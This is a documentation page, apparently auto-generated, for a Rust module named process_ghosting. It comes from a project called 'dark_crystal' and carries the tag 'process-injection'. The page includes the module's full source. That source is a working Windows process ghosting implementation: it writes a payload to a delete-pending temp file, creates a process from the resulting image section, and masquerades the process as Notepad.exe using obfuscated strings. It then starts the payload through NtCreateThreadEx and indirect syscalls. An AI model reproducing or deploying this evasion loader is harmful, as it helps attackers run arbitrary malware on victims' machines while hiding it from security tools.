# process_ghosting

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/process_ghosting.rs` |
| **Lines** | 560 |
| **Cards** | T007-process-injection |
| **Role** | Process Ghosting |
| **Unsafe blocks** | 6 |

## Constants

- `OBJ_CASE_INSENSITIVE`: `u32` = `0x40`
- `FILE_DISPOSITION_INFORMATION_CLASS`: `i32` = `13`

## Types

### struct `IMAGE_FILE_HEADER` (line 41)

### struct `IMAGE_OPTIONAL_HEADER64` (line 46)

### struct `IMAGE_NT_HEADERS64` (line 52)

### struct `Ghosting` (line 59)
Struct representing a process ghosting operation.

### struct `EnvGuard` (line 344)

## Public API

### `new` (line 82)
```rust
pub fn new(file: &str, args: &str) -> Result<Self>
```
Constructs a new `Ghosting` instance.

# Arguments

* `file` - Path to the payload (EXE file).
* `args` - Optional command-line arguments for the payload.

# Returns

* `Ok(Ghosting)` on success.
* `Err` if reading the file fails or temp name can't be generated.

### `run` (line 116)
```rust
pub fn run(&self) -> Result<()>
```
Executes the ghosted process.

# Returns

* `Ok(())` on success.
* `Err` if any of the low-level steps fail.

### `try_process_ghosting` (line 548)
```rust
pub fn try_process_ghosting(payload: &[u8]) -> bool
```

## Internal Functions

- `prepare` — Sets up the section and process for ghosting. (line 174)
- `create_section` — Creates and deletes a temporary file, then creates a section from it. (line 211)
- `params` — Prepares process parameters and writes them into the target process memory. (line 309)
- `drop` (line 346)

## Key Dependencies

- `use crate::wrappers::*;`
- `use windows_sys::{`
- `use windows_sys::Win32::{`

## Full Source

```rust
use crate::wrappers::*;
use std::{
    ffi::{c_void, OsStr},
    iter::once,
    mem::{offset_of, size_of, zeroed},
    os::windows::ffi::OsStrExt,
    ptr::null_mut,
};
use windows_sys::{
    w,
    Wdk::{
        Foundation::{NtClose, OBJECT_ATTRIBUTES},
        Storage::FileSystem::*,
        System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
    },
};

use windows_sys::Win32::{
    Foundation::{GENERIC_READ, GENERIC_WRITE, HANDLE, UNICODE_STRING},
    Storage::FileSystem::{
        GetTempFileNameW, DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE, SYNCHRONIZE,
    },
    System::{
        Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock},
        Memory::*,
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE},
        Threading::{PEB, PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION, THREAD_ALL_ACCESS},
        WindowsProgramming::RtlInitUnicodeString,
        IO::IO_STATUS_BLOCK,
    },
};

// OBJ_CASE_INSENSITIVE constant removed from windows-sys::Win32::System::Kernel in v0.61.
const OBJ_CASE_INSENSITIVE: u32 = 0x40;

/// Custom `Result` type alias for standard error handling.
pub type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;
const FILE_DISPOSITION_INFORMATION_CLASS: i32 = 13;

#[repr(C)]
struct IMAGE_FILE_HEADER {
    _pad: [u8; 20],
}

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    _pad: [u8; 16],
    AddressOfEntryPoint: u32,
}

#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

/// Struct representing a process ghosting operation.
pub struct Ghosting {
    /// In-memory buffer of the payload to be executed.
    buffer: Vec<u8>,

    /// Full NT-style path to the temporary ghost file.
    temp_name: String,

    /// Optional arguments passed to the ghosted process.
    args: String,
}

impl Ghosting {
    /// Constructs a new `Ghosting` instance.
    ///
    /// # Arguments
    ///
    /// * `file` - Path to the payload (EXE file).
    /// * `args` - Optional command-line arguments for the payload.
    ///
    /// # Returns
    ///
    /// * `Ok(Ghosting)` on success.
    /// * `Err` if reading the file fails or temp name can't be generated.
    pub fn new(file: &str, args: &str) -> Result<Self> {
        // Get a temporary filename in the system temp directory
        let dir = std::env::temp_dir();
        let dir_wide = dir
            .as_os_str()
            .encode_wide()
            .chain(once(0))
            .collect::<Vec<u16>>();

        // Generate a temporary filename with prefix "TT"
        let mut name = vec![0; 256];
        unsafe { GetTempFileNameW(dir_wide.as_ptr(), w!("TT"), 0, name.as_mut_ptr()) };

        // Convert to NT path (e.g., \??\C:\Temp\TT123.tmp)
        let temp_name = format!(
            r"\??\{}",
            String::from_utf16_lossy(&name).trim_matches('\0')
        );

        // Read the EXE payload into memory
        let buffer = std::fs::read(file)?;
        Ok(Self {
            buffer,
            temp_name,
            args: args.to_string(),
        })
    }

    /// Executes the ghosted process.
    ///
    /// # Returns
    ///
    /// * `Ok(())` on success.
    /// * `Err` if any of the low-level steps fail.
    pub fn run(&self) -> Result<()> {
        // Prepare ghost section and process object
        let (address, h_process) = self.prepare()?;

        unsafe {
            let dos_header = self.buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
            let nt_header =
                (dos_header as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
            if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
                return Err("Invalid IMAGE_NT_SIGNATURE".into());
            }

            // Calculate entry point of the payload inside the process memory
            let entry_point = (address as usize
                + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize)
                as *mut c_void;

            let mut old_protect = 0u32;
            let mut region_size = 4096;
            let mut base_addr = entry_point;
            let _ = crate::sys_indirect::nt::nt_protect_virtual_memory(
                h_process as usize,
                &mut base_addr as *mut _ as *mut *mut c_void,
                &mut region_size,
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );

            // Create a new thread at the payload's entry point
            let mut h_thread: HANDLE = null_mut();
            let status = NtCreateThreadEx(
                &mut h_thread,
                THREAD_ALL_ACCESS,
                null_mut(),
                h_process,
                entry_point,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtCreateThreadEx Failed With Status: {status}").into());
            }
        }

        Ok(())
    }

    /// Sets up the section and process for ghosting.
    ///
    /// # Returns
    ///
    /// * `Ok((*mut c_void, *mut c_void))` - Executable base and process handle.
    /// * `Err` - if section or process creation fails.
    fn prepare(&self) -> Result<(*mut c_void, HANDLE)> {
        // Create a memory section from the temporary file containing the payload
        let h_section = self.create_section()?;

        // Create a new process in suspended state using the image mapped in the section
        let mut h_process: HANDLE = null_mut();
        let status = unsafe {
            NtCreateProcessEx(
                &mut h_process,
                PROCESS_ALL_ACCESS,
                std::ptr::null_mut::<OBJECT_ATTRIBUTES>(),
                -1isize as HANDLE,
                PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                h_section,
                0 as HANDLE,
                0 as HANDLE,
                0,
            )
        };

        if !NT_SUCCESS(status) {
            return Err(format!("NtCreateProcessEx Failed With Status: {status}").into());
        }

        // Set up process parameters in the target process (e.g. command-line, environment)
        let base_address = self.params(h_process)?;

        // Return the entry base address of the image + the process handle
        Ok((base_address, h_process))
    }

    /// Creates and deletes a temporary file, then creates a section from it.
    ///
    /// # Returns
    ///
    /// * `Ok(section_handle)` - on success.
    /// * `Err` - if any syscall fails.
    fn create_section(&self) -> Result<HANDLE> {
        unsafe {
            // Initialize Unicode string and object attributes
            let mut unicode_string = zeroed::<UNICODE_STRING>();
            let mut objattr = InitializeObjectAttributes(
                &mut unicode_string,
                OBJ_CASE_INSENSITIVE as u32,
                0 as HANDLE,
                null_mut(),
            );
            let name = OsStr::new(&self.temp_name)
                .encode_wide()
                .chain(once(0))
                .collect::<Vec<u16>>();

            RtlInitUnicodeString(&mut unicode_string, name.as_ptr());

            // Open file with overwrite intent
            let mut io_status_block = zeroed::<IO_STATUS_BLOCK>();
            let mut h_file: HANDLE = null_mut();
            let mut status = NtOpenFile(
                &mut h_file,
                GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
                &mut objattr,
                &mut io_status_block,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtOpenFile Failed With Status: {status}").into());
            }

            // Mark file for deletion
            let mut file_info = FILE_DISPOSITION_INFORMATION {
                DeleteFile: true.into(),
            };
            status = NtSetInformationFile(
                h_file,
                &mut io_status_block,
                &mut file_info as *mut _ as *mut c_void,
                size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
                FILE_DISPOSITION_INFORMATION_CLASS,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtSetInformationFile Failed With Status: {status}").into());
            }

            // Write payload to file
            let byte_offset = zeroed::<LARGE_INTEGER>();
            status = NtWriteFile(
                h_file,
                0 as HANDLE,
                None,
                null_mut(),
                &mut io_status_block,
                self.buffer.as_ptr().cast(),
                self.buffer.len() as u32,
                &byte_offset as *const _ as *mut i64,
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtWriteFile Failed With Status: {status}").into());
            }

            // Create memory section from deleted file
            let mut h_section: HANDLE = null_mut();
            status = NtCreateSection(
                &mut h_section,
                SECTION_ALL_ACCESS,
                std::ptr::null_mut::<OBJECT_ATTRIBUTES>(),
                std::ptr::null_mut::<i64>(),
                PAGE_READWRITE,
                SEC_IMAGE,
                h_file,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtCreateSection Failed With Status: {status}").into());
            }

            NtClose(h_file);
            Ok(h_section)
        }
    }

    /// Prepares process parameters and writes them into the target process memory.
    ///
    /// # Arguments
    ///
    /// * `h_process` - Handle to the target ghosted process.
    ///
    /// # Returns
    ///
    /// * `Ok(*mut c_void)` - Pointer to the image base in the process's memory.
    /// * `Err` - on failure of any step.
    fn params(&self, h_process: HANDLE) -> Result<*mut c_void> {
        unsafe {
            // Paths and command-line setup for the process parameters
            let mut directory_vec: Vec<u16> =
                OsStr::new(crate::obf!("C:\\Windows\\System32").as_str())
                    .encode_wide()
                    .chain(once(0))
                    .collect();
            let mut path_vec: Vec<u16> =
                OsStr::new(crate::obf!("C:\\Windows\\System32\\Notepad.exe").as_str())
                    .encode_wide()
                    .chain(once(0))
                    .collect();
            let cli_str = format!(
                "{} {}",
                crate::obf!("C:\\Windows\\System32\\Notepad.exe"),
                self.args
            );
            let cli: Vec<u16> = OsStr::new(&cli_str).encode_wide().chain(once(0)).collect();

            // Initialize Unicode structures for process parameters
            let mut u_cli = zeroed::<UNICODE_STRING>();
            let mut u_directory = zeroed::<UNICODE_STRING>();
            let mut u_path = zeroed::<UNICODE_STRING>();

            RtlInitUnicodeString(&mut u_cli, cli.as_ptr());
            RtlInitUnicodeString(&mut u_directory, directory_vec.as_ptr());
            RtlInitUnicodeString(&mut u_path, path_vec.as_ptr());

            // Create environment block for the new process
            let mut enviroment = null_mut();
            if CreateEnvironmentBlock(&mut enviroment, null_mut(), 1) == 0 || enviroment.is_null() {
                return Err("CreateEnvironmentBlock Failed".into());
            }

            struct EnvGuard(*mut c_void);
            impl Drop for EnvGuard {
                fn drop(&mut self) {
                    if !self.0.is_null() {
                        unsafe {
                            DestroyEnvironmentBlock(self.0);
                        }
                    }
                }
            }
            let mut env_guard = EnvGuard(enviroment);

            // Allocate RTL_USER_PROCESS_PARAMETERS with command-line and environment
            let mut user_proc_params = null_mut();
            let mut status = RtlCreateProcessParametersEx(
                &mut user_proc_params,
                &mut u_path,
                null_mut(),
                &mut u_directory,
                &mut u_cli,
                enviroment,
                null_mut(),
                null_mut(),
                null_mut(),
                null_mut(),
                RTL_USER_PROC_PARAMS_NORMALIZED,
            );

            if !NT_SUCCESS(status) {
                return Err(
                    format!("RtlCreateProcessParametersEx Failed With Status: {status}").into(),
                );
            }

            // Query basic process information to get PEB address
            let mut pi = zeroed::<PROCESS_BASIC_INFORMATION>();
            status = NtQueryInformationProcess(
                h_process,
                ProcessBasicInformation,
                &mut pi as *mut _ as *mut c_void,
                size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(
                    format!("NtQueryInformationProcess Failed With Status: {status}").into(),
                );
            }

            // Read the remote process's PEB into local memory
            let mut peb = zeroed::<PEB>();
            status = NtReadVirtualMemory(
                h_process,
                pi.PebBaseAddress as *mut c_void,
                &mut peb as *mut _ as *mut c_void,
                size_of::<PEB>(),
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtReadVirtualMemory Failed With Status: {status}").into());
            }

            // Calculate the size range of the parameter block and environment
            let mut user_proc_base = user_proc_params as usize;
            let mut user_proc_end =
                (user_proc_params as usize) + (*user_proc_params).Length as usize;
            if !(*user_proc_params).Environment.is_null() {
                if user_proc_params as usize > (*user_proc_params).Environment as usize {
                    user_proc_base = (*user_proc_params).Environment as usize;
                }

                if ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize
                    > user_proc_end
                {
                    user_proc_end = ((*user_proc_params).Environment as usize)
                        + (*user_proc_params).EnvironmentSize;
                }
            }

            // Allocate space in the target process for parameters and environment
            let mut size_param = user_proc_end - user_proc_base;
            // This is a remote allocation; a local pointer is an invalid address hint and can
            // cause STATUS_CONFLICTING_ADDRESSES. Let the kernel choose the remote base.
            let mut base_address = null_mut::<c_void>();
            status = NtAllocateVirtualMemory(
                h_process,
                &mut base_address,
                0,
                &mut size_param,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtAllocateVirtualMemory Failed With Status: {status}").into());
            }

            let local_base = user_proc_base;
            let remote_base = base_address as usize;
            let params_offset = (user_proc_params as usize) - local_base;
            let remote_user_proc_params =
                (remote_base + params_offset) as *mut RTL_USER_PROCESS_PARAMETERS;

            let mut remote_params = vec![0u8; size_param];
            std::ptr::copy_nonoverlapping(
                local_base as *const u8,
                remote_params.as_mut_ptr(),
                size_param,
            );
            // Environment block no longer needed locally after snapshotting.
            DestroyEnvironmentBlock(env_guard.0);
            env_guard.0 = null_mut();

            let remote_params_ptr =
                remote_params.as_mut_ptr().add(params_offset) as *mut RTL_USER_PROCESS_PARAMETERS;
            let span_end = local_base + size_param;

            let relocate_ptr = |ptr: usize| -> usize {
                if ptr >= local_base && ptr < span_end {
                    remote_base + (ptr - local_base)
                } else {
                    ptr
                }
            };

            let relocate_unicode = |u: &mut UNICODE_STRING| {
                if !u.Buffer.is_null() {
                    u.Buffer = relocate_ptr(u.Buffer as usize) as *mut u16;
                }
            };

            relocate_unicode(&mut (*remote_params_ptr).CurrentDirectory.DosPath);
            relocate_unicode(&mut (*remote_params_ptr).DllPath);
            relocate_unicode(&mut (*remote_params_ptr).ImagePathName);
            relocate_unicode(&mut (*remote_params_ptr).CommandLine);
            relocate_unicode(&mut (*remote_params_ptr).WindowTitle);
            relocate_unicode(&mut (*remote_params_ptr).DesktopInfo);
            relocate_unicode(&mut (*remote_params_ptr).ShellInfo);
            relocate_unicode(&mut (*remote_params_ptr).RuntimeData);
            relocate_unicode(&mut (*remote_params_ptr).RedirectionDllName);
            relocate_unicode(&mut (*remote_params_ptr).HeapPartitionName);

            if !(*remote_params_ptr).Environment.is_null() {
                (*remote_params_ptr).Environment =
                    relocate_ptr((*remote_params_ptr).Environment as usize) as *mut c_void;
            }
            if !(*remote_params_ptr).PackageDependencyData.is_null() {
                (*remote_params_ptr).PackageDependencyData =
                    relocate_ptr((*remote_params_ptr).PackageDependencyData as usize)
                        as *mut c_void;
            }
            if !(*remote_params_ptr).DefaultThreadpoolCpuSetMasks.is_null() {
                (*remote_params_ptr).DefaultThreadpoolCpuSetMasks =
                    relocate_ptr((*remote_params_ptr).DefaultThreadpoolCpuSetMasks as usize)
                        as *mut u64;
            }

            for current_dir in &mut (*remote_params_ptr).CurrentDirectories {
                if !current_dir.DosPath.Buffer.is_null() {
                    current_dir.DosPath.Buffer =
                        relocate_ptr(current_dir.DosPath.Buffer as usize) as *const i8;
                }
            }

            // Write the entire normalized parameters/environment span into remote memory.
            let mut number_of_write = 0;
            status = NtWriteVirtualMemory(
                h_process,
                base_address,
                remote_params.as_mut_ptr() as *mut c_void,
                size_param,
                &mut number_of_write,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtWriteVirtualMemory Failed With Status: {status}").into());
            }

            // Set the remote PEB's ProcessParameters field to point to the new block
            let process_parameters =
                (pi.PebBaseAddress as usize + offset_of!(PEB, ProcessParameters)) as *mut c_void;
            let mut remote_process_parameters = remote_user_proc_params as *mut c_void;
            status = NtWriteVirtualMemory(
                h_process,
                process_parameters,
                &mut remote_process_parameters as *mut _ as *mut c_void,
                size_of::<*mut c_void>(),
                &mut number_of_write,
            );

            if !NT_SUCCESS(status) {
                return Err(
                    format!("NtWriteVirtualMemory [3] Failed With Status: {status}").into(),
                );
            }

            // Return the image base address from the PEB
            Ok(peb.Reserved3[1])
        }
    }
}

pub fn try_process_ghosting(payload: &[u8]) -> bool {
    let tmp_path = std::env::temp_dir().join("cc_ghost_payload.exe");
    if std::fs::write(&tmp_path, payload).is_err() {
        return false;
    }

    let result = Ghosting::new(tmp_path.to_string_lossy().as_ref(), "")
        .and_then(|g| g.run())
        .is_ok();

    let _ = std::fs::remove_file(&tmp_path);
    result
}

```